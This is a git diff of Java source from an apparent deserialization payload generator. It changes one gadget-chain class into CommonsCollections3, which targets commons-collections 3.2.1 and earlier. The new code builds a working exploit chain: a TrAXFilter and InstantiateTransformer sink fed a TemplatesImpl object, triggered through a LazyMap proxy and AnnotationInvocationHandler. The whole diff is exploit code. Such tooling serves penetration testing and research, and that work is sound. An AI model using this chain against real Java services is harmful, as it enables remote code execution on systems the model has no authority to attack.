@@ -1,31 +1,36 @@
-package com.ppp.chain.collections3;
+package com.ppp.chain.commonscollections3;
 
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
+import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import javax.xml.transform.Templates;
+import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
 
 /**
  * @author Whoopsunix
  */
 @Dependencies({"commons-collections:commons-collections:<=3.2.1"})
-@Sink({Sink.InvokerTransformer3})
-public class CommonsCollections6E implements ObjectPayload<Object> {
+@Authors({Authors.FROHOFF})
+@Sink({Sink.TemplatesImpl})
+public class CommonsCollections3 implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections6E.class, args);
+        PayloadRunner.run(CommonsCollections3.class, args);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
@@ -37,29 +42,23 @@ public class CommonsCollections6E implements ObjectPayload<Object> {
         return kickOffObject;
     }
 
-    public Object getChain(Object transformers) throws Exception {
+    public Object getChain(Object templates) throws Exception {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
+        final Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates})};
+
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
+        final Map mapProxy = KickOff.createMemoitizedProxy(lazyMap, Map.class);
 
-//        // way A
-//        HashMap hashMap = new HashMap();
-//        hashMap.put(entry, "x");
-//        lazyMap.clear();
-//
-//        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-//
-//        return hashMap;
-
-        // way B
-        HashMap hashMap = new HashMap();
-        hashMap.put(entry, "x");
-        HashSet hashSet = new HashSet(hashMap.keySet());
-        lazyMap.clear();
+        InvocationHandler handler = KickOff.annotationInvocationHandler(mapProxy);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
-        return hashSet;
+
+        return handler;
     }
 }
